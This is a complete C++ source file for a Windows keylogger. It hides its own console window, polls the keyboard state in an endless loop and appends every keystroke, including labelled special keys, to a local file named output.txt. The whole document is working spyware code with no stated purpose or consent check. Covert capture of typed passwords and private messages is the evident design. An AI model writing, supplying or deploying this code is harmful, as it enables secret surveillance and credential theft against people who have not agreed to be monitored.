#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void WRITER(string input){
    fstream textFile;
    textFile.open("output.txt", fstream::app);
    if (textFile.is_open()){
        textFile << input;
        textFile.close();
        cout << input;
    }
}
bool writeSpecialKeys(int key){
    switch (key) {
        case VK_BACK:
            WRITER("%BACKSPACE%");
            return true;
        case VK_TAB:
            WRITER("%TAB%");
            return true;
        case VK_CLEAR:
            WRITER("%CLEAR%");
            return true;    
        case VK_RETURN:
            WRITER("%ENTER%");
            return true;
        case VK_SHIFT:
            WRITER("%SHIFT%");
            return true;
        case VK_CONTROL:
            WRITER("%CTRL%");
            return true;
        case VK_MENU:
            WRITER("%ALT%");
            return true;    
        case VK_PAUSE:
            WRITER("%PAUSE%");
            return true;
        case VK_CAPITAL:
            WRITER("%CAPSLOCK%");
            return true;
        case VK_ESCAPE:
            WRITER("%ESC%");
            return true;
        case VK_SPACE:
            WRITER(" ");
            return true;    
        case VK_PRIOR:
            WRITER("%PAGEUP%");
            return true;
        case VK_NEXT:
            WRITER("%PAGEDOWN%");
            return true;
        case VK_END:
            WRITER("%END%");
            return true;
        case VK_HOME:
            WRITER("%HOME%");
            return true;    
        case VK_LEFT:
            WRITER("%LEFTARROW%");
            return true;
        case VK_UP:
            WRITER("%UPARROW%");
            return true;
        case VK_RIGHT:
            WRITER("%RIGHTARROW%");
            return true;
        case VK_DOWN:
            WRITER("%DOWNARROW%");
            return true;
        case VK_SELECT:
            WRITER("%SELECT%");
            return true;
        case VK_PRINT:
            WRITER("%PRINT%");
            return true;
        case VK_EXECUTE:
            WRITER("%EXECUTE%");
            return true;
        case VK_SNAPSHOT:
            WRITER("%PRINTSCREEN%");
            return true;
        case VK_INSERT:
            WRITER("%INSERT%");
            return true;
        case VK_DELETE:
            WRITER("%DEL%");
            return true;
        case VK_HELP:
            WRITER("%HELP%");
            return true;
        case VK_NUMPAD0:
            WRITER("0");
            return true;
        case VK_NUMPAD1:
            WRITER("1");
            return true;
        case VK_NUMPAD2:
            WRITER("2");
            return true;
        case VK_NUMPAD3:
            WRITER("3");
            return true;
        case VK_NUMPAD4:
            WRITER("4");
            return true;
        case VK_NUMPAD5:
            WRITER("5");
            return true;
        case VK_NUMPAD6:
            WRITER("6");
            return true;
        case VK_NUMPAD7:
            WRITER("7");
            return true;
        case VK_NUMPAD8:
            WRITER("8");
            return true;
        case VK_NUMPAD9:
            WRITER("9");
            return true;
        case VK_MULTIPLY:
            WRITER("%MULTIPLY%");
            return true;
        case VK_ADD:
            WRITER("%ADD%");
            return true;
        case VK_SEPARATOR:
            WRITER("%SEPARATOR%");
            return true;
        case VK_SUBTRACT:
            WRITER("%SUBTRACT%");
            return true;
        case VK_DECIMAL:
            WRITER("%DECIMAL");
            return true;
        case VK_DIVIDE:
            WRITER("%DIVIDE%");
            return true;
        case VK_F1:
            WRITER("%F1%");
            return true;
        case VK_F2:
            WRITER("%F2%");
            return true;
        case VK_F3:
            WRITER("%F3%");
            return true;
        case VK_F4:
            WRITER("%F4%");
            return true;
        case VK_F5:
            WRITER("%F5%");
            return true;
        case VK_F6:
            WRITER("%F6%");
            return true;
        case VK_F7:
            WRITER("%F7%");
            return true;
        case VK_F8:
            WRITER("%F8%");
            return true;
        case VK_F9:
            WRITER("%F9%");
            return true;
        case VK_F10:
            WRITER("%F10%");
            return true;
        case VK_F11:
            WRITER("F11");
            return true;
        case VK_F12:
            WRITER("F12");
            return true;
        case VK_LSHIFT:
            WRITER("%LSHIFT%");
            return true;
        case VK_RSHIFT:
            WRITER("%RSHIFT%");
            return true;
        case VK_OEM_PLUS:
            WRITER("+");
            return true;
        case VK_OEM_COMMA:
            WRITER(",");
            return true;
        case VK_OEM_MINUS:
            WRITER("-");
            return true;
        case VK_OEM_PERIOD:
            WRITER(".");
            return true;
        case VK_OEM_2:
            WRITER("%/?%");
            return true;
        case VK_OEM_3:
            WRITER("%`~%");
            return true;
        case VK_OEM_4:
            WRITER("%[{%");
            return true;
        case VK_OEM_5:
            WRITER("%\\|%");
            return true;
        case VK_OEM_6:
            WRITER("%]}%");
            return true;
        case VK_OEM_7:
            WRITER("'\"");
            return true;
        default:
            return false;

    }
}

int main(){
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    while (true) {
        for (int i = 8; i <= 222; i++){
            if (GetAsyncKeyState(i) == -32767){
                if (!writeSpecialKeys(i)){
                    fstream textfile;
                    textfile.open("output.txt", fstream::app);
                    if (textfile.is_open()){
                        textfile << char(i);
                        textfile.close();
                    }
                    cout << char(i);
                }
            }
        }
    }
}